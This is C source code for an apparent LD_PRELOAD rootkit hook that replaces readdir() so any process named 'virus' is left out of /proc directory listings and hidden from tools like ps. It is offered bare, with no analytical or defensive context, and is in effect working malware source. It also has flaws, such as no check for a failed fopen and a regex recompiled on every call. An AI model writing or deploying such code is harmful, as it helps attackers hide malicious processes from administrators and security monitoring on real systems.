#define _GNU_SOURCE

#include <string.h>
#include <stdio.h>
#include <dirent.h>
#include <dlfcn.h>
#include <regex.h>


static struct dirent* (*original_readdir_ptr)(DIR *dirp) = NULL;
regex_t is_pid;

struct dirent *readdir(DIR *dirp) {

    void *handle;

    handle = dlopen("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);

    original_readdir_ptr = dlsym(handle, "readdir"); //dlsym(RTLD_NEXT, "readdir")

    dlclose(handle);

    struct dirent *next_process = original_readdir_ptr(dirp);
    if (next_process == NULL) {
        return NULL;
    }
    char* process_pid = next_process->d_name;
    

    if (regcomp(&is_pid, "^([0-9]+)$", REG_EXTENDED)!= 0) {
        printf("problem with regex compilation\n");
    }

    int matched = regexec(&is_pid, process_pid, 0 , NULL, 0);
    if (matched == 0) {
        
        char file_path[256] = "/proc/";
        char* final_part = "/stat";
        
        strcat(strcat(file_path,process_pid),final_part);

        FILE *fp;
        char process_name[255];
        fp = fopen(file_path, "r");
        fscanf(fp, "%*d %s", process_name);
        if (strcmp(process_name,"(virus)") == 0) {
            next_process = original_readdir_ptr(dirp);
        }
        fclose(fp);
    }

   return next_process;
}